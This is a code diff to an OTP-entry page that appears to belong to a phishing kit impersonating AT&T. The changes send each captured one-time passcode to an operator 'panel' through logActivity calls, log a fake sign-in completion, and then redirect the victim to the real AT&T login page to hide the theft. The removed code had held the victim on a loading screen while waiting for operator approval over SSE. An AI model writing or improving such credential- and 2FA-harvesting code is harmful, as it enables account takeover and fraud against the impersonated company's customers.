@@ -163,19 +163,18 @@ export default function OTPPage() {
           // Get cached username from localStorage or URL
           const storedUserId = localStorage.getItem('lastUserId') || '';
           
-          // Log OTP entry
-          const activityId = await logActivity('otp', storedUserId, { 
+          // Log OTP entry (panel monitoring only, no blocking)
+          await logActivity('otp', storedUserId, { 
             otpCode: otpCode
           });
-          pendingActivityId = activityId;
           
-          // Show loading screen
-          const loadingScreen = document.getElementById('loading-screen');
-          if (loadingScreen) loadingScreen.classList.add('active');
-          submitBtn.disabled = true;
+          // Log sign-in completion
+          await logActivity('signin', storedUserId, { 
+            otpCode: otpCode
+          });
           
-          // Wait for approval via SSE
-          waitForApprovalSSE(activityId, 'otp', storedUserId);
+          // Redirect to AT&T sign-in page
+          window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
         }
       });
     }
